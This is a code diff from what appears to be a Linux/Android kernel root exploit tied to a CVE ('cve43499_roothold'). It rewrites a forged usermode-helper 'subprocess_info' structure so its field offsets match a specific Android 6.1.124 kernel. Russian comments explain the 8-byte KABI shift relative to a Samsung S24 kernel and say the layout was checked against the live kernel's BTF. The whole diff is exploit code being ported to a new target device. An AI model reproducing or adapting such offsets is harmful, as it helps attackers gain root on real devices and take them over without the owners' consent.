@@ -11,16 +11,20 @@ uint32_t root_uid_after = 0xffffffff;
 #define ROOT_HOLD_READY_SOCKET "cve43499_roothold"
 
 struct umh_subprocess_info {
-  uint8_t work[48];
-  uint64_t complete;
-  uint64_t path;
-  uint64_t argv;
-  uint64_t envp;
-  int32_t wait;
-  int32_t retval;
-  uint64_t init;
-  uint64_t cleanup;
-  uint64_t data;
+  /* ownroot V2425A 6.1.124: work_struct = 0x38 (56Б, 3 Android KABI поля)
+   * e3q S24 6.1.145: work_struct = 0x30 (48Б, 2 KABI поля)
+   * → +8Б ко всем полям после work!
+   * Верифицировано через BTF живого ядра: work@0x38, complete@0x40, path@0x48 */
+  uint8_t work[56];  /* 0x38 = 56, НЕ 48! (android_oem_data1@0x30) */
+  uint64_t complete;  /* @0x40 */
+  uint64_t path;      /* @0x48 */
+  uint64_t argv;      /* @0x50 */
+  uint64_t envp;      /* @0x58 */
+  int32_t wait;       /* @0x60 */
+  int32_t retval;     /* @0x64 */
+  uint64_t init;      /* @0x68 */
+  uint64_t cleanup;   /* @0x70 */
+  uint64_t data;      /* @0x78 */
 };
 
 struct umh_completion {
@@ -41,7 +45,7 @@ struct umh_kernel_data {
   uint64_t envp[1];
 };
 
-_Static_assert(sizeof(struct umh_subprocess_info) == 112,
+_Static_assert(sizeof(struct umh_subprocess_info) == 120,  /* 0x78 — наш 6.1.124! (e3q=112) */
                "subprocess_info layout");
 _Static_assert(sizeof(struct umh_completion) == 32, "completion layout");
 
